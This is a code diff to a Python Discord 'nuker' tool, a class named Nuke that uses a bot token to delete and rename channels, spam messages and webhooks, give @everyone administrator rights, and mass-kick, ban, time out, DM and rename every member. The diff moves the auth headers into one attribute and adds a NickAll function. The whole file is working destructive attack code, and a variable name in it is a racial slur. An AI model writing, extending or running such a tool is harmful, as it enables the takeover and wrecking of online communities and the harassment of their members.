@@ -43,6 +43,7 @@ class Nuke:
         self.embeds = embeds
         self.ban = ban
         self.webhook = webhook
+        self.headers = {'authorization': f'Bot {self.tkn}'}
 
     def embed(self):
         with open('embed.json', 'r', encoding='utf-8') as f:
@@ -50,7 +51,7 @@ class Nuke:
             return emb
     def deletechannel(self, chid):
         try:
-            r = requests.delete(f'https://discord.com/api/v9/channels/{chid}', headers={'authorization': f'Bot {self.tkn}'})
+            r = requests.delete(f'https://discord.com/api/v9/channels/{chid}', headers=self.headers)
             if r.status_code in [200, 201, 204]:
                 Logging.success(f'Successfully deleted channel {chid}')
             elif r.status_code == 429:
@@ -65,7 +66,7 @@ class Nuke:
         try:
             r = requests.get(
                 f'https://discord.com/api/v9/guilds/{serverid}/channels',
-                headers={'authorization': f'Bot {self.tkn}'}
+                headers=self.headers
             )
             if r.status_code in [200, 201, 204]:
                 return r.json()
@@ -93,7 +94,7 @@ class Nuke:
         payload = {
             'name': name,
         }
-        c = requests.post(f'https://discord.com/api/v9/guilds/{serverid}/channels', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+        c = requests.post(f'https://discord.com/api/v9/guilds/{serverid}/channels', headers=self.headers, json=payload)
         if c.status_code in [200, 201, 204]:
             chnl = c.json()
             Logging.success(f'Successfully created channel {chnl["id"]}')
@@ -141,7 +142,7 @@ class Nuke:
             payload.update(embed)
         for _ in range(amount):
             try:
-                r = requests.post(f'https://discord.com/api/v9/channels/{chid}/messages', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+                r = requests.post(f'https://discord.com/api/v9/channels/{chid}/messages', headers=self.headers, json=payload)
                 if r.status_code in [200, 201, 204]:
                     Logging.success(f'Succesfully sent message in {chid}')
                 elif r.status_code == 429:
@@ -340,7 +341,7 @@ class Nuke:
                     pass
             else:
                 Logging.fail('No image URL')
-        r = requests.patch(f'https://ptb.discord.com/api/v9/guilds/{self.serverid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+        r = requests.patch(f'https://ptb.discord.com/api/v9/guilds/{self.serverid}', headers=self.headers, json=payload)
         if r.status_code in [200, 201, 204]:
             Logging.success('Successfully edited the server')
         else:
@@ -352,7 +353,7 @@ class Nuke:
             'permissions': str(permissions)
         }
         try:
-            r = requests.post(f'https://discord.com/api/v9/guilds/{serverid}/roles', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+            r = requests.post(f'https://discord.com/api/v9/guilds/{serverid}/roles', headers=self.headers, json=payload)
             if r.status_code in [200, 201, 204]:
                 rjs = r.json()
                 Logging.success(f'Successfully created role {rjs["id"]}')
@@ -382,7 +383,7 @@ class Nuke:
             payload = {
             "roles": [role]
         }
-            r = requests.patch(f'https://discord.com/api/v9/guilds/{serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+            r = requests.patch(f'https://discord.com/api/v9/guilds/{serverid}/members/{userid}', headers=self.headers, json=payload)
             if r.status_code in [200, 201, 204]:
                 Logging.success(f'Gave {userid} admin')
             elif r.status_code == 429:
@@ -393,7 +394,7 @@ class Nuke:
     def GiveEveryoneAdmin(self, serverid):
         payload = {'permissions': '4360658820268031'}
         try:
-            r = requests.patch(f'https://discord.com/api/v9/guilds/{serverid}/roles/{serverid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+            r = requests.patch(f'https://discord.com/api/v9/guilds/{serverid}/roles/{serverid}', headers=self.headers, json=payload)
             if r.status_code in [200, 201, 204]:
                 Logging.success('Give admin to @everyone')
             elif r.status_code == 429:
@@ -411,7 +412,7 @@ class Nuke:
         "communication_disabled_until": days
         }
         try:
-            r = requests.patch(f'https://discord.com/api/v9/guilds/{self.serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+            r = requests.patch(f'https://discord.com/api/v9/guilds/{self.serverid}/members/{userid}', headers=self.headers, json=payload)
             st = 'days' if days != 1 else 'day'
             if r.status_code in [200, 201, 204]:
                 Logging.success(f'Successfully timed out {userid} for {days} {st}')
@@ -425,12 +426,12 @@ class Nuke:
     def dm(self, userid, msg):
         payload = {"recipient_id": userid}
         try:
-            create = requests.post("https://discord.com/api/v9/users/@me/channels", json=payload, headers={'authorization': f'Bot {self.tkn}'})
+            create = requests.post("https://discord.com/api/v9/users/@me/channels", json=payload, headers=self.headers)
             if create.status_code in [200, 201, 204]:
                 js = create.json()
                 chid = js['id']
                 mesg = {'content': msg}
-                r = requests.post(f'https://discord.com/api/v10/channels/{chid}/messages', headers={'authorization': f'Bot {self.tkn}'}, json=mesg)
+                r = requests.post(f'https://discord.com/api/v10/channels/{chid}/messages', headers=self.headers, json=mesg)
                 if r.status_code in [200, 201, 204]:
                     Logging.success(f'Successfully sent message to {userid}')
                     
@@ -445,7 +446,7 @@ class Nuke:
         members = []
         threads = []
         payload = {'limit': 1000}
-        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers=self.headers, params=payload)
         m = nig.json()
         for mem in m:
             id = mem['user']['id']
@@ -465,7 +466,7 @@ class Nuke:
         threads = []
         ids = loadids()
         payload = {'limit': 1000}
-        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers=self.headers, params=payload)
         m = nig.json()
         for mem in m:
             id = mem['user']['id']
@@ -473,7 +474,7 @@ class Nuke:
             
         def kick(userid):
             try:
-                r = requests.delete(f'https://discord.com/api/v9/guilds/{self.serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+                r = requests.delete(f'https://discord.com/api/v9/guilds/{self.serverid}/members/{userid}', headers=self.headers, json=payload)
                 if r.status_code in [200, 201, 204]:
                     Logging.success(f'Kicked {userid}')
                 elif r.status_code == 429:
@@ -499,7 +500,7 @@ class Nuke:
         ids = loadids()
         threads = []
         payload = {'limit': 1000}
-        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers=self.headers, params=payload)
         m = nig.json()
         for mem in m:
             id = mem['user']['id']
@@ -508,7 +509,7 @@ class Nuke:
         def ban(userid):
             payload = {'delete_message_seconds': 0}
             try:
-                r = requests.put(f'https://discord.com/api/v9/guilds/{self.serverid}/bans/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+                r = requests.put(f'https://discord.com/api/v9/guilds/{self.serverid}/bans/{userid}', headers=self.headers, json=payload)
                 if r.status_code in [200, 201, 204]:
                     Logging.success(f'Banned {userid}')
                 elif r.status_code == 429:
@@ -528,14 +529,49 @@ class Nuke:
         
         for t in threads:
             t.join()        
+    
+    def nick(self, userid, nickname):
+        try:
+            r = requests.patch(f'https://discord.com/api/v9/guilds/{self.serverid}/members/{userid}', headers=self.headers, json={'nick': nickname})
+            if r.status_code in [200, 201, 204]:
+                Logging.success(f'Changed {userid}\'s nickname to {nickname}')
+            elif r.status_code == 429:
+                Logging.info(f'Rate limit response while trying to change {userid}\'s nickname')
+            else:
+                Logging.fail(f'Failed to change {userid}\'s nickname, {r.status_code} {r.text}')
+        except:
+            Logging.fail(f'Failed to change {userid}\'s nickname, {e}')
+            
+    def NickAll(self, nickname):
+        ids = loadids()
+
+        members = []
+        threads = []
+        payload = {'limit': 1000}
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers=self.headers, params=payload)
+        m = nig.json()
+        for mem in m:
+            id = mem['user']['id']
+            members.append(id)
+    
+        for member in members:
+            if member in ids:
+                continue
+            t = threading.Thread(target=self.nick, args=(member, nickname,))
+            threads.append(t)
+            t.start()
+            time.sleep(0.01)
         
+        for t in threads:
+            t.join()        
+    
     def TimeoutAll(self, days):
         ids = loadids()
 
         members = []
         threads = []
         payload = {'limit': 1000}
-        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers=self.headers, params=payload)
         m = nig.json()
         for mem in m:
             id = mem['user']['id']
@@ -559,7 +595,7 @@ class Nuke:
         "features": []  
     }
         try:
-            r = requests.patch(f'https://discord.com/api/v9/guilds/{self.serverid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+            r = requests.patch(f'https://discord.com/api/v9/guilds/{self.serverid}', headers=self.headers, json=payload)
             if r.status_code in [200, 201, 204]:
                 Logging.success('Successfully disabled community mode')
             elif r.status_code == 429:
@@ -574,7 +610,7 @@ class Nuke:
         payload = {
         'name': name,
         }
-        r = requests.patch(f'https://discord.com/api/v9/channels/{id}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+        r = requests.patch(f'https://discord.com/api/v9/channels/{id}', headers=self.headers, json=payload)
         if r.status_code in [200, 201, 204]:
             Logging.success(f'Successfully renamed channel {id}')
         elif r.status_code == 429:
@@ -587,7 +623,7 @@ class Nuke:
         'name': name,
         'parent_id': cate
         }
-        r = requests.patch(f'https://discord.com/api/v9/channels/{id}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)    
+        r = requests.patch(f'https://discord.com/api/v9/channels/{id}', headers=self.headers, json=payload)    
         if r.status_code in [200, 201, 204]:
             Logging.success(f'Successfully modified channel {id}')
         elif r.status_code == 429:
@@ -639,3 +675,4 @@ class Nuke:
         
         elif type.lower() == 'no rename':
             self.SpamWebhooks2(msg, amount)
+            
